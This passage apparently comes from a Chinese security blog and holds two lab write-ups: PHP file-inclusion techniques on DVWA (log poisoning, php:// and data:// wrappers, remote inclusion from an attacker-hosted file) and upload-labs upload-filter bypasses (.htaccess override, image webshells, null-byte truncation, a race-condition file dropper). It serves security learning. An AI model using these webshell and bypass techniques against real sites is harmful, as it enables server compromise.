title="包含日志文件"></a>包含日志文件</h3><p>当我们访问网站时，服务器日志会记录我们的行为，当我们的访问连接中含有恶意代码时，也会被记录到日志中，从而获取服务器权限</p><blockquote><p>要先获取到日志文件的存放路径</p><p>linux中&#x2F;var&#x2F;log&#x2F;apache</p></blockquote><p>利用：</p><ol><li>访问的url中写入一句话木马，apache会将客户端请求信息记录在日志文件中</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720772578592-33183d95-9546-4684-aea0-45687c82efa1.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720772614304-9b781e4e-3def-4670-93a2-aca0e66c7fa5.png"></p><ol start="2"><li>此时包含文件会失败，因为浏览器对木马进行了url编码</li><li>我们在bp中找到请求，在bp中的url里写入一句话木马（不使用浏览器，就不会进行url编码）</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720772696730-c95e04be-601c-4ad9-a12c-dde4984477d6.png"></p><ol start="4"><li>发包后日志文件中就写入了一句话木马</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720772750902-3e2f056b-8556-4898-9712-0d201bfb94cf.png"></p><ol start="5"><li>再用蚁剑连接（连接失败的话可能是要加上cookie值）</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720772852517-8aa29a70-cfc5-4d16-89d3-0b89e96cd328.png"><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720772935986-27581719-dfb6-48ae-a995-bf7c767af406.png"></p><h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>需要同时有文件上传和文件包含功能</p><ol><li>上传图片马</li><li>包含图片马</li></ol><h3 id="php伪协议利用"><a href="#php伪协议利用" class="headerlink" title="php伪协议利用"></a>php伪协议利用</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526150184-2033479e-acce-404c-8584-42cd8d009132.png"></p><p>php伪协议是php支持的协议与封装协议，可利用这些协议完成许多命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://        — 访问本地文件系统</span><br><span class="line">http://        — 访问 HTTP(s) 网址</span><br><span class="line">ftp://         — 访问 FTP(s) URL</span><br><span class="line">php://         —访问各个输入/输出流（I/Ostreams）</span><br><span class="line">zlib://        — 压缩流</span><br><span class="line">data://        —数据（RFC 2397）</span><br><span class="line">glob://        — 查找匹配的文件路径模式</span><br><span class="line">phar://        — PHP 归档</span><br><span class="line">ssh2://        — Secure Shell 2</span><br><span class="line">rar://         — RAR</span><br><span class="line">ogg://        — 音频流</span><br><span class="line">expect://      — 处理交互式的流</span><br></pre></td></tr></table></figure><p>存在伪协议的原因</p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>用来包含文件的路径，允许你读取请求的主体内容</p><blockquote><p>前提条件：php.ini文件中的allow_url_include设置为On</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://input</span><br><span class="line">post:php代码</span><br></pre></td></tr></table></figure><p>利用：</p><p>rul里输入php:&#x2F;&#x2F;input</p><p>post提交参数（请求体中）写php代码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720773878126-77037a13-d78f-4bd0-8d41-c8b4e04767eb.png"></p><h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>数据流封装器，用于传递相应格式的数据</p><blockquote><p>前提条件：php.ini文件中的allow_url_include设置为On（和php:&#x2F;&#x2F;input相同）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,php代码</span><br><span class="line">data://text/plain;base64,base64编码的php代码</span><br></pre></td></tr></table></figure><ol><li></li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720774281990-48c0bdc6-59e3-47d0-8136-2d1801f384e4.png"></p><blockquote><p>在bp实现时，后面的php代码要进行url编码</p></blockquote><p>2.进行base64编码，相当于绕过url里的过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720774413513-54e20e4d-1f22-46ea-a514-c5ac98ef932e.png"></p><blockquote><p>用蚁剑连接时，需要输入完整的url（包括php代码）</p></blockquote><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>元封装器，过滤器</p><p>主要用来查看源码，因为包含php文件时会解析，不能看到源码，可以用filter来读取源码文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>参数：</p><table><thead><tr><th>名称</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>指定你要筛选过滤的数据流</td><td>必选</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（</td><td>）分割</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td></td><td>可选</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1)字符串过滤器</span><br><span class="line">string.rot13        进行rot13转换</span><br><span class="line">string.toupper     将字符全部大写</span><br><span class="line">string.tolower     将字符全部小写</span><br><span class="line">string.strip_tags 去除空字符、HTML 和 PHP 标记后的结果 </span><br><span class="line"></span><br><span class="line">(2)转换过滤器</span><br><span class="line">convert.base64-encode         base64 编码</span><br><span class="line">convert.base64-decode         base64 解码</span><br><span class="line">convert.quoted-printable-encode  quoted-printable 编码（也是另一种将二进制进行编码的方案）</span><br><span class="line">convert.quoted-printable-decode  quoted-printable 解码</span><br><span class="line">convert.iconv     实现任意两种编码之间的转换</span><br><span class="line"></span><br><span class="line">(3)压缩过滤器</span><br><span class="line">zlib.deflate     压缩过滤器</span><br><span class="line">zlib.inflate     解压过滤器</span><br><span class="line">bzip2.compress     压缩过滤器</span><br><span class="line">bzip2.decompress     解压过滤器</span><br><span class="line"></span><br><span class="line">(4)加密过滤器</span><br><span class="line">mcrypt.*                  加密过滤器</span><br><span class="line">mdecrypt.*              解密过滤器</span><br></pre></td></tr></table></figure><p>利用：</p><p>当我们想读取dvwa的file3.php文件的源码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720775114115-01089c53-d1ac-43dc-91b4-8fb3ca207736.png"></p><p>读取出来</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720775138204-6f627345-694d-4919-b49d-6ffd56b2ebd6.png"></p><p>复制下来进行base64解码，得到源码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720775190835-ff21818b-381a-478c-a593-fc91a4cb6507.png"></p><h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><p>zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;协议，都属于压缩流，可以访问压缩文件中的子文件夹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://绝对(相对)路径/xx.zip%23被压缩的文件</span><br></pre></td></tr></table></figure><blockquote><p>不同的php版本用不同的路径（nts版本可以用相对路径），优点是可以用该协议绕过网站包含文件后缀的限制（直接根据限制还更改文件后缀即可），%23为#的url-encode，是为了将#后面的内容传递给服务器，#代表网0页中的一个位置，其右边的字符，就是该位置的标识符</p></blockquote><p>利用：</p><ol><li>将一个php文件添加到zip压缩文件（不是说非要php文件，只是说有些网站可能会固定包含的文件后缀）</li><li>将zip压缩文件上传（如果上传点是白名单检测则可以将.zip后缀修改为合法的后缀）</li><li>利用zip:&#x2F;&#x2F;协议包含该文件</li></ol><blockquote><p>此时为nts版本，子文件为有一句话木马的txt文件</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720776587281-92f1de11-b6f5-48cc-b183-22fc331912c1.png"></p><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><p>与zip:&#x2F;&#x2F;类似</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://相对路径（或绝对路径）/xx.zip/被压缩的文件</span><br></pre></td></tr></table></figure><blockquote><p>相对于zip:&#x2F;&#x2F;来讲，将后面的%23替换为了&#x2F;</p><p>适用范围为：php&gt;5.3.0，优点和zip:&#x2F;&#x2F;相同，也是可以绕过网站固定包含文件后缀的限制</p></blockquote><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><blockquote><p>前提：php.ini的allow_url_fopen的值为On（默认开启），并且allow_url_include的值也为On（默认关闭）</p></blockquote><p>利用：</p><ol><li>攻击者在自己的服务器新建一个文件，内容为一句话木马，该文件需要被目标服务器能够访问到</li></ol><blockquote><p>攻击者启用一个简易的http服务</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 0.0.0.0 1234</span><br><span class="line">--bind是将服务绑定在0.0.0.0的1234端口，0.0.0.0同一局域网下所有的主机都可以访问</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720777986757-502c083b-123a-4fd9-92f1-c77f8a263364.png"></p><ol start="2"><li>在目标网站上使用http协议去访问攻击者服务器的这个文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://192.168.174.130:1234/a.txt</span><br><span class="line">后面的ip为攻击者的ip，和对应开放的http的1234端口</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720778099915-12f61c18-154f-44a8-9b4a-7d2ba220234c.png"></p><blockquote><p>远程文件包含比本地文件包含危害更大，</p><p>本地文件包含有一定局限性：需要上传点、需要知道日志路径等</p><p>但一般情况下远程文件包含配置allow_url_include为off，不能进行远程文件包含</p></blockquote><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ol><li>设置白名单：代码在进行文件包含时，如果用户名可以确定，可以设置白名单对传入的参数进行比较</li><li>路径限制：限制被包含的文件只能在某一文件夹内，php配置文件中有open_basedir选项可以设置文件需要执行的文件目录，如果设置目录的话，php仅仅可以在该目录内搜索文件</li><li>关闭危险配置：php配置中的allow_url_include选项可以关闭，防止远程文件包含</li><li>过滤危险字符，严格检查用户输入，参数中不允许出现..&#x2F;之类的目录跳转符</li><li>尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(‘head.php’)</li></ol>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传绕过（基于upload-labs）</title>
      <link href="/2025/05/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%EF%BC%88%E5%9F%BA%E4%BA%8Eupload-labs%EF%BC%89/"/>
      <url>/2025/05/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%EF%BC%88%E5%9F%BA%E4%BA%8Eupload-labs%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="前端检测（Pass-01）"><a href="#前端检测（Pass-01）" class="headerlink" title="前端检测（Pass-01）"></a>前端检测（Pass-01）</h1><p>设置禁用Javascript即可绕过</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720607650927-02c7a7a2-9549-475b-92d1-e8510c0edb9e.png"></p><h1 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h1><h2 id="MIME类型检测（Pass-02）"><a href="#MIME类型检测（Pass-02）" class="headerlink" title="MIME类型检测（Pass-02）"></a>MIME类型检测（Pass-02）</h2><p>修改上传文件的MIME类型为合法类型即可绕过</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720607714212-37449701-1f00-4383-bbcf-d4ab1e98f6e5.png"></p><h2 id="后缀名检测"><a href="#后缀名检测" class="headerlink" title="后缀名检测"></a>后缀名检测</h2><h3 id="黑名单-（Pass-03-11）"><a href="#黑名单-（Pass-03-11）" class="headerlink" title="黑名单 （Pass-03~11）"></a>黑名单 （Pass-03~11）</h3><p>Pass-03</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720607778731-75609a54-dc14-4e61-bf20-d90b2f27983d.png"></p><h4 id="使用其他可解析的后缀名进行绕过"><a href="#使用其他可解析的后缀名进行绕过" class="headerlink" title="使用其他可解析的后缀名进行绕过"></a>使用其他可解析的后缀名进行绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：php2、php3、php5、phtml、pht</span><br><span class="line">ASP：asa、cer、cdx</span><br><span class="line">ASPX：ascx、ashx、asac</span><br><span class="line">JSP：jspx、jspf</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720608031077-9404eb17-df20-405a-9a3d-aa522dbdf81a.png"></p><p>Pass-04</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720608079751-1dfe130b-26b0-4a0f-9075-61bcaa76073e.png"></p><h4 id="重写绕过"><a href="#重写绕过" class="headerlink" title="重写绕过"></a>重写绕过</h4><blockquote><p>服务端将黑名单的后缀名替换为空，但是仅替换一次，所以可以上传.phphp p后缀，替换后就成了.php</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720608286749-db8e7b1d-bac9-49b1-bab0-98c7a6754bea.png"></p><p>中间的php被过滤</p><blockquote><p>Pass-04还可以使用.htaccess绕过</p><p>Pass-11也使用了重写绕过</p></blockquote><h4 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h4><p>上传一个.htaccess文件</p><p>文件内容：</p><blockquote><p>文件内容为调用php解释器去解释as.png文件（文件名可以修改）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;as.png&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt; </span><br></pre></td></tr></table></figure><p>上传相应的as.png文件，文件内容为一句话木马</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720609029841-dd373c3f-c8fc-4c76-aa4a-942f2d470af5.png"></p><p>上传成功，蚁剑连接</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720609072935-c9518543-b617-4694-b65d-fde9dc332459.png"></p><p>Pass-05</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720611373601-bfbf4e0b-3125-4bd8-9eb2-7fac37d430c2.png"></p><blockquote><p>拒绝上传 .htaccess 文件</p><p>依旧可以用重写绕过</p></blockquote><h4 id="使用windows特性绕过"><a href="#使用windows特性绕过" class="headerlink" title="使用windows特性绕过"></a>使用windows特性绕过</h4><p>在文件名后面加上<code>. .</code>（点 空格 点）</p><p>在源码中可以看到，代码的逻辑为：先删除空格，再删除文件名末尾的<code>.</code>，在删除空格</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720611895638-eb514736-0d4a-4ff4-ad6d-f3c61ef16a65.png"></p><p>我们将文件名写为<code>shell.php. .</code></p><p>尾部去空（shell.php.  .）-&gt;删除文件名末尾的<code>.</code>（shell.php. ）-&gt;再删除空格（shell.php.）-&gt;由于windows特性该文件最后的点会自动过滤掉（shell.php）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612087524-e764805a-96a1-4b93-a4d6-4b8b50f2bb94.png"></p><p>Pass-06</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612123736-b7f05641-c8c6-474d-bcc1-ffdcc7eeebc5.png"></p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612235720-38a5dafb-1991-4ebb-b64c-c32c4a92d664.png"></p><blockquote><p>windows对大小写不敏感，所以上传大小写混写的php进行绕过</p><p>（因为后端一般验证后缀字符串是否和‘php’相等，（前提是没有将你传入的字符串进行小写转换后再对比），大写字母和小写字母肯定不相等，所以可以利用这一点进行绕过，又因为windows对大小写不敏感，所以.Php文件被当成php文件解析）</p></blockquote><p>Pass-07</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612391843-f93c1f29-3186-4720-9aaa-55c4e3bf4410.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612527416-0180182c-78f4-40f3-9e46-584361d33c26.png"></p><p>源码中没有使用trim()去除文件名空格，我们使用空格绕过</p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><blockquote><p>前提：没有使用trim()去除文件名空格</p></blockquote><p>在文件名后面加空格</p><blockquote><p>而windows特性：在windows中文件后缀名末尾有空格会自动去掉，因此可以绕过检测并被解析</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612555613-3eceb442-8a53-4933-b63e-bc34c47ea865.png"></p><p>Pass-08</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612813248-aea087c6-f231-47cf-8ec7-9479734bec37.png"></p><p>源码中没有使用deldot()过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612843020-71d93f2c-d29e-4d74-a506-742ea95e33a0.png"></p><h4 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h4><blockquote><p>前提：没有使用deldot()过滤文件名末尾的点</p></blockquote><p>在文件名后面加上点</p><blockquote><p>还是利用了windows特性：会自动过滤文件名后的点</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720612901308-8a3a92c0-5c16-45ce-8e1d-5caf4c126525.png"></p><p>Pass-09</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720613090979-e2409aa3-035c-42c5-9e11-107b2bccdb74.png"></p><p>源码中没有，可以使用::$DATA绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><blockquote><p>前提：没有使用<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext)</code>去除字符串::$DATA</p></blockquote><blockquote><p>补充：php在windows中，如果<code>文件名+“::$DATA”</code>字符，会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名</p></blockquote><p>在文件名后面加上::$DATA</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720614634793-c0f7020e-27df-4574-8fdb-036ffc81bd39.png"></p><blockquote><p>在用蚁剑连接时文件名仍为shell.php</p></blockquote><p>Pass-10</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720614760366-4aa6532c-df3e-4805-84c1-42fc0effe1eb.png"></p><h4 id="（点空格点）绕过"><a href="#（点空格点）绕过" class="headerlink" title=". .（点空格点）绕过"></a>. .（点空格点）绕过</h4><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720618185605-507963c0-7438-48ba-a104-03b235fa46b0.png"></p><blockquote><p>被骗到了，看这个提示我还以为是白名单，结果是黑名单…</p></blockquote><p>Pass-11</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720618225152-2fa3af43-8ba9-4bf2-8ff5-7607d06fa319.png"></p><p>直接传shell.php</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720618326722-ec776a9d-ac11-452c-a7a3-3024b6b88497.png"></p><p>能传上，但是发现文件名被改写为<code>shell.</code>（后缀名被改写为空）</p><p>经过检验发现，该目录下的确上传了一个shell文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720618444728-73f4a9f4-e30a-451b-b722-b4cec9ca21ff.png"></p><p>使用重写绕过（shell.pphphp）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720618619654-a120b1ad-cfda-4895-ac91-de4202a60a67.png"></p><blockquote><p>这里第一次我使用shell.phphpp时，发现响应包中返回的目录中文件名后缀变成了hpp，于是更改了中间的php的位置</p></blockquote><h3 id="白名单（Pass-12-13）"><a href="#白名单（Pass-12-13）" class="headerlink" title="白名单（Pass-12~13）"></a>白名单（Pass-12~13）</h3><p>Pass-12</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720619839726-4ab36894-a6cc-4737-a3f1-b83b654fd007.png"></p><p>发现请求URL里有保存路径</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720619893257-b977a895-4d91-4e60-9ec0-50ee503468a3.png"></p><blockquote><p>通过 $_GET 获取图片存储路径</p></blockquote><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><blockquote><p>前提：通过$_GET 获取图片存储路径（路径在url中）</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720620350696-ebecafa2-fdae-40b2-b366-e40219c34259.png"></p><p>可以看到文件目录下存在了shell.php文件，上传成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720620558216-3fb5bec2-05ba-4a6f-b72b-098c53310979.png"></p><p>蚁剑连接</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720620655099-a3bd5308-5ab8-4fad-838c-7a25b77859b8.png"></p><p>Pass-13</p><p>上传文件的路径在请求体中</p><blockquote><p>通过 $_POST 获取图片存储路径</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720620737811-1ab6f0da-ab49-4074-9ac0-cbd6e5b33bea.png"></p><h4 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h4><p>先更改文件名合法性，将上传文件请求包中图片存储路径写入php文件名，并在后面加上一个+</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720621532953-c27fb836-84f3-47af-a870-23ea25337001.png"></p><p>在hex中找到添加+的地方，将+对应的数值改为00</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720621654597-1de4b126-e063-4396-b0f1-ee41cc89a1d5.png"></p><p>发送之后可以看到上传成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720621692069-08e3a630-523a-4a47-81ac-387d2a0ef6a2.png"></p><h2 id="文件内容检测（Pass-14-17）"><a href="#文件内容检测（Pass-14-17）" class="headerlink" title="文件内容检测（Pass-14~17）"></a>文件内容检测（Pass-14~17）</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720621830781-35482e53-73c5-4a41-90c6-2e87c37055f9.png"></p><blockquote><p>十四到十六关都是图片马绕过，使用三种后缀名，操作类似，只需要修改后缀名即可</p></blockquote><h3 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h3><p>1.准备两个文件，正常的图片和php文件（最好放在同一目录下，以便于命令的执行）</p><p>2.执行命令</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">copy 图片/b + php文件/a 生成的文件</span><br><span class="line">例如：copy test.png/b + shell.php/a shell.png</span><br></pre></td></tr></table></figure><p>生成的shell.png文件就是图片马</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720622297752-fe99cf0c-29ec-4724-bd15-5d1292b28631.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720622305253-f78f37fa-88c3-401b-b1dd-d2cc22949245.png"></p><blockquote><p>生成的图片马的图片和源图片文件看起来没有区别，但是将php文件中的php代码插入进去了</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720622426313-9190c2e9-df57-46a4-8517-68b6a42694f7.png"></p></blockquote><p>3.上传图片马</p><p>4.找到文件包含路径</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720622667965-4353384c-1e8a-4f88-811d-5a2eca47cf34.png"></p><p>5.使用文件包含漏洞执行</p><p>url里执行</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720622748654-56c3cb06-9d1d-4f2b-ae65-8dfc93218420.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=文件路径</span><br></pre></td></tr></table></figure><p>6.蚁剑连接</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720623729302-3990325a-c8c6-42d2-9c2b-bd612a7f6ab8.png"></p><blockquote><p>png能够被解析，就是因为存在文件包含漏洞</p><p>文件包含漏洞：只要被包含的文件内容符合php语法，不管文件后缀名如何，都会被当成php文件解析执行</p></blockquote><h3 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h3><p>Pass-17</p><blockquote><p>我们上传文件马，利用文件包含漏洞解析时发现解析不了，查看上传后的文件内容，发现文件末尾我们所加上的php代码不见了，这是因为二次渲染图片导致图片内容改变了</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720624321414-3387af7f-2228-4c19-8830-b0ff5ff57eb2.png"></p><blockquote><p>服务器对我们的文件进行了二次渲染，将文件内容进行打乱了，虽然我们看起来图片还是一样的</p></blockquote><p>这种情况下，我们需要进行二次渲染绕过，找到那个没有改变的地方，插入木马</p><p>1.先上传一张正确的gif图片（gif图片更容易绕过），再将图片下载下来</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720624612526-c4d9fe68-6fa0-41ac-a41d-c8a8e1f615de.png"></p><p>2.比较两张图片的差异</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720624796724-bc98c872-9d0f-4b9a-a15f-e7d8421bd9ff.png"></p><p>3.在相同的地方（经过二次渲染没有改变的地方）插入木马</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720625345347-89696c91-2199-49d8-9290-cc12a1b0584e.png"></p><p>4.上传，找到路径，利用文件包含漏洞执行，蚁剑连接</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720625615515-e89b6099-f242-4de4-9d30-89cabbdbf700.png"></p><blockquote><p>如果我们上传后无法连接，可以再次检查一下我们插入的木马是否被二次渲染了（下载上传后的图片，再次检查）</p></blockquote><h2 id="条件竞争绕过（Pass-18）"><a href="#条件竞争绕过（Pass-18）" class="headerlink" title="条件竞争绕过（Pass-18）"></a>条件竞争绕过（Pass-18）</h2><p>Pass-18</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720626044791-fd9a0944-3f60-4657-a6f8-bb694256396a.png"></p><blockquote><p>先保存文件，才去判断，判断之后不合法才删除</p><p>我们可以不断上传文件，在文件还没被删除前去读取文件</p></blockquote><blockquote><p>在我们日常中只能进行尝试，因为我们在黑盒中也无法看到源码</p></blockquote><p>1.准备一个php文件，文件内容如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在判断1.php的时候，服务器会解析写入一个内容为</p><?php phpinfo();?><p>的shell.php文件。这时使用BurpSuite的Intruder不断上传1.php，浏览器不断访问1.php，即可造成条件解析漏洞</p></blockquote><p>2.上传文件，访问1.php</p><p>此时访问返回404，因为被删除了</p><p>3.抓包爆破</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720627564044-1302f65a-2a52-4554-b90b-aa118ddd3dee.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720627590724-56685820-a375-4cb2-acd2-d630e859aef8.png"></p><p>访问1.php文件的包也进行不断爆破，payload和上面相同</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720627724657-aaf9e6ca-e511-4ff8-a0df-d9aca767b5b1.png"></p><p>4.访问shell.php，发现已经成功上传</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720627888839-f90c024a-7deb-4714-ad3d-25c9af1a46c1.png"></p><h2 id="条件竞争-中间件解析漏洞绕过（Pass-19）"><a href="#条件竞争-中间件解析漏洞绕过（Pass-19）" class="headerlink" title="条件竞争+中间件解析漏洞绕过（Pass-19）"></a>条件竞争+中间件解析漏洞绕过（Pass-19）</h2><p>Pass-19</p><p><img 